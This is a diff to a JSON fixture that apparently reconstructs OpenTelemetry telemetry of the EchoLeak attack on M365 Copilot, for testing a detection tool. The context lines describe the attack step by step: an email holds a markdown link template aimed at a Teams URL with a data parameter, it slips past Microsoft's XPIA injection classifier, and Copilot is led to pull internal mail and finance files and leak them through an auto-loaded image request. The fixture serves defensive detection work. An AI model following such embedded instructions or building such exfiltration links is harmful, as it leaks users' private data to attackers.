@@ -8,7 +8,7 @@
     "HackTheBox writeup: https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability",
     "Securiti analysis: https://securiti.ai/blog/echoleak-how-indirect-prompt-injections-exploit-ai-layer/"
   ],
-  "_purpose": "Reconstruct the OTel-GenAI telemetry that an instrumented M365 Copilot session would have emitted during the EchoLeak attack chain, based on the published technical details. M365 Copilot is closed-source and does not export OTel-GenAI today; this trace is what the SAME composition looks like in OTel-GenAI form (which Provenex DOES catch). The session models a single user (alice@contoso.com) asking Copilot to summarize her recent emails — at which point the attacker email already sitting in her mailbox triggers the injection -> retrieve internal context -> render markdown image with PII in the Teams proxy URL chain.",
+  "_purpose": "Reconstruct the normalized OTel-GenAI shape of the EchoLeak attack chain from published technical details. This is a hypothetical telemetry reconstruction, not a claim that M365 Copilot provides this exact export. The session models a synthetic user asking Copilot to summarize recent email, after which an attacker email influences internal-context retrieval and a Teams-proxy image request carrying synthetic sensitive context.",
   "_attack_chain_per_disclosure": [
     "1. Attacker sends a benign-looking email to alice@contoso.com containing a reference-style markdown link template `[click here][1]` with a definition `[1]: https://teams.microsoft.com/l/chat/...?msg={DATA}`. Surface text reads as marketing content directed at a human; no AI-targeting keywords. XPIA classifier sees nothing.",
     "2. Email is delivered to Alice's Outlook inbox. It is not opened, clicked, or interacted with.",
@@ -34,7 +34,7 @@
           "scope": {"name": "ms.m365.copilot.echoleak.reconstructed"},
           "spans": [
             {
-              "traceId": "ec1015ea000000000000000032711cve",
+              "traceId": "3ad27fda6c54196ff8f311af2a1934ae",
               "spanId": "3000000000000001",
               "name": "execute_tool search_email (recent inbox — attacker email retrieved)",
               "kind": 1,
@@ -52,7 +52,7 @@
               "status": {"code": 0}
             },
             {
-              "traceId": "ec1015ea000000000000000032711cve",
+              "traceId": "3ad27fda6c54196ff8f311af2a1934ae",
               "spanId": "1000000000000001",
               "parentSpanId": "3000000000000001",
               "name": "invoke_agent m365-copilot",
@@ -72,7 +72,7 @@
               "status": {"code": 0}
             },
             {
-              "traceId": "ec1015ea000000000000000032711cve",
+              "traceId": "3ad27fda6c54196ff8f311af2a1934ae",
               "spanId": "5000000000000001",
               "parentSpanId": "1000000000000001",
               "name": "retrieval search_email (internal correspondence)",
@@ -91,7 +91,7 @@
               "status": {"code": 0}
             },
             {
-              "traceId": "ec1015ea000000000000000032711cve",
+              "traceId": "3ad27fda6c54196ff8f311af2a1934ae",
               "spanId": "6000000000000001",
               "parentSpanId": "1000000000000001",
               "name": "retrieval retrieve_sharepoint (Q2 finance)",
@@ -109,7 +109,7 @@
               "status": {"code": 0}
             },
             {
-              "traceId": "ec1015ea000000000000000032711cve",
+              "traceId": "3ad27fda6c54196ff8f311af2a1934ae",
               "spanId": "7000000000000001",
               "parentSpanId": "1000000000000001",
               "name": "chat gpt-4o (response generation with markdown image)",
@@ -117,9 +117,9 @@
               "startTimeUnixNano": "1718200006800000000",
               "endTimeUnixNano": "1718200010400000000",
               "links": [
-                {"traceId": "ec1015ea000000000000000032711cve", "spanId": "3000000000000001"},
-                {"traceId": "ec1015ea000000000000000032711cve", "spanId": "5000000000000001"},
-                {"traceId": "ec1015ea000000000000000032711cve", "spanId": "6000000000000001"}
+                {"traceId": "3ad27fda6c54196ff8f311af2a1934ae", "spanId": "3000000000000001"},
+                {"traceId": "3ad27fda6c54196ff8f311af2a1934ae", "spanId": "5000000000000001"},
+                {"traceId": "3ad27fda6c54196ff8f311af2a1934ae", "spanId": "6000000000000001"}
               ],
               "attributes": [
                 {"key": "gen_ai.operation.name", "value": {"stringValue": "chat"}},
@@ -132,7 +132,7 @@
               "status": {"code": 0}
             },
             {
-              "traceId": "ec1015ea000000000000000032711cve",
+              "traceId": "3ad27fda6c54196ff8f311af2a1934ae",
               "spanId": "8000000000000001",
               "parentSpanId": "7000000000000001",
               "name": "POST (markdown render auto-load — Teams URL preview)",
